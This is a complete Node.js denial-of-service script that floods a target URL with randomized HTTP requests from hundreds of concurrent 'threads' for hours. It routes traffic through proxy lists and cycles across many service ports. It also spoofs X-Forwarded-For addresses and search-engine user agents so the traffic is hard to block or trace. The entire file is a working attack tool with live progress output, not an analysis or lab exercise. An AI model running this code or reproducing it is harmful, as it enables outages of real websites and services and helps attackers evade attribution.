const https = require('https');
const http = require('http');
const url = require('url');
const fs = require('fs');
const crypto = require('crypto');
const net = require('net');

const TARGET_URL = process.argv[2];
const THREADS = parseInt(process.argv[3] || '500');
const REQUEST_DELAY = parseInt(process.argv[4] || '10');
const DURATION = parseInt(process.argv[5] || '360') * 60 * 1000;
const PROXY_FILE = 'proxy.txt';

const COMMON_PORTS = [80, 443, 8080, 8443, 8000, 8888, 9000, 9090, 21, 22, 25, 53, 110, 143, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 27017];

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'
];

let proxyList = [];
let activeIntervals = [];
let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let statusCodes = {};
let startTime = Date.now();
let portIndex = 0;

try {
    const data = fs.readFileSync(PROXY_FILE, 'utf8');
    proxyList = data.split('\n')
        .map(line => line.trim())
        .filter(line => line !== '' && !line.startsWith('#'));
    if (proxyList.length === 0) {
        console.log('Empty proxy file. Using direct connections.');
    }
} catch (err) {
    console.log('No proxy file found. Using direct connections.');
}

function getRandomItem(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomProxy() {
    if (proxyList.length === 0) return null;
    const proxyStr = getRandomItem(proxyList);
    const parts = proxyStr.split(':');
    if (parts.length !== 2 && parts.length !== 4) return null;
    return {
        host: parts[0],
        port: parseInt(parts[1]),
        user: parts.length === 4 ? parts[2] : null,
        pass: parts.length === 4 ? parts[3] : null
    };
}

function getNextPort() {
    return getRandomItem(COMMON_PORTS);
}

function generateRandomHeaders(hostname) {
    return {
        'User-Agent': getRandomItem(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'no-cache',
        'Referer': 'https://www.google.com/',
        'Host': hostname,
        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        'Connection': 'keep-alive'
    };
}

function displayBanner() {
    console.clear();
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const rps = elapsed > 0 ? Math.floor(totalRequests / elapsed) : 0;
    const remaining = Math.max(0, Math.floor((DURATION - (Date.now() - startTime)) / 1000));
    console.log('============================================================');
    console.log('  TARGET: ' + TARGET_URL);
    console.log('  PROXIES LOADED: ' + proxyList.length);
    console.log('============================================================');
    console.log('  TOTAL REQUESTS:  ' + totalRequests);
    console.log('  SUCCESS:         ' + successCount);
    console.log('  ERRORS:          ' + errorCount);
    console.log('  ACTIVE THREADS:  ' + activeIntervals.length);
    console.log('  REQUESTS/SEC:    ' + rps);
    console.log('  ELAPSED:         ' + elapsed + 's');
    console.log('  REMAINING:       ' + remaining + 's');
    console.log('------------------------------------------------------------');
    console.log('  STATUS CODES:');
    for (const code in statusCodes) {
        const bar = '#'.repeat(Math.floor((statusCodes[code] / Math.max(totalRequests, 1)) * 30) || 0);
        console.log('  ' + code + ' : ' + statusCodes[code] + ' ' + bar);
    }
    console.log('============================================================');
}

function sendDirectRequest(targetHost, targetPort, useHttps) {
    return new Promise((resolve) => {
        const protocol = useHttps ? https : http;
        const headers = generateRandomHeaders(targetHost);
        const options = {
            hostname: targetHost,
            port: targetPort,
            path: '/?' + crypto.randomBytes(8).toString('hex'),
            method: getRandomItem(['GET', 'HEAD', 'POST']),
            headers: headers,
            timeout: 5000,
            rejectUnauthorized: false
        };
        const req = protocol.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {
                const code = res.statusCode.toString();
                statusCodes[code] = (statusCodes[code] || 0) + 1;
                if (code.startsWith('2') || code.startsWith('3')) successCount++;
                else errorCount++;
                totalRequests++;
                displayBanner();
                resolve();
            });
        });
        req.on('error', () => {
            errorCount++;
            totalRequests++;
            statusCodes['ERR'] = (statusCodes['ERR'] || 0) + 1;
            displayBanner();
            resolve();
        });
        req.on('timeout', () => {
            req.destroy();
            errorCount++;
            totalRequests++;
            statusCodes['TIMEOUT'] = (statusCodes['TIMEOUT'] || 0) + 1;
            displayBanner();
            resolve();
        });
        if (options.method === 'POST') req.write(crypto.randomBytes(100).toString('hex'));
        req.end();
    });
}

function sendProxyRequest(proxy, targetHost, targetPort, useHttps) {
    return new Promise((resolve) => {
        const options = {
            hostname: proxy.host,
            port: proxy.port,
            method: 'CONNECT',
            path: `${targetHost}:${targetPort}`,
            timeout: 5000
        };
        if (proxy.user && proxy.pass) {
            options.headers = {
                'Proxy-Authorization': 'Basic ' + Buffer.from(`${proxy.user}:${proxy.pass}`).toString('base64')
            };
        }
        const req = http.request(options);
        req.on('connect', (res, socket) => {
            const requestString = `GET /?${crypto.randomBytes(8).toString('hex')} HTTP/1.1\r\n` +
                `Host: ${targetHost}\r\n` +
                `User-Agent: ${getRandomItem(USER_AGENTS)}\r\n` +
                `Accept: */*\r\n` +
                `X-Forwarded-For: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}\r\n` +
                `Connection: close\r\n\r\n`;
            socket.write(requestString);
            socket.on('data', (data) => {
                const response = data.toString();
                const statusMatch = response.match(/HTTP\/1\.\d (\d{3})/);
                if (statusMatch) {
                    const code = statusMatch[1];
                    statusCodes[code] = (statusCodes[code] || 0) + 1;
                    if (code.startsWith('2') || code.startsWith('3')) successCount++;
                    else errorCount++;
                }
                totalRequests++;
                displayBanner();
                socket.end();
                resolve();
            });
            socket.on('error', () => {
                errorCount++;
                totalRequests++;
                statusCodes['SOCKET_ERR'] = (statusCodes['SOCKET_ERR'] || 0) + 1;
                displayBanner();
                resolve();
            });
        });
        req.on('error', () => {
            errorCount++;
            totalRequests++;
            statusCodes['PROXY_ERR'] = (statusCodes['PROXY_ERR'] || 0) + 1;
            displayBanner();
            resolve();
        });
        req.on('timeout', () => {
            req.destroy();
            errorCount++;
            totalRequests++;
            statusCodes['TIMEOUT'] = (statusCodes['TIMEOUT'] || 0) + 1;
            displayBanner();
            resolve();
        });
        req.end();
    });
}

async function floodRequest() {
    const target = url.parse(TARGET_URL);
    const targetHost = target.hostname;
    const targetPort = getNextPort();
    const useHttps = targetPort === 443 || target.protocol === 'https:';
    const proxy = getRandomProxy();
    if (proxy) {
        await sendProxyRequest(proxy, targetHost, targetPort, useHttps);
    } else {
        await sendDirectRequest(targetHost, targetPort, useHttps);
    }
}

function startThread() {
    const intervalId = setInterval(() => {
        floodRequest();
    }, REQUEST_DELAY);
    activeIntervals.push(intervalId);
}

function stopAll() {
    activeIntervals.forEach(id => clearInterval(id));
    activeIntervals = [];
    console.log('\nAttack finished. Total requests: ' + totalRequests);
    process.exit(0);
}

displayBanner();
console.log('Starting attack...');

for (let i = 0; i < THREADS; i++) {
    setTimeout(() => startThread(), i * 5);
}

setTimeout(() => stopAll(), DURATION);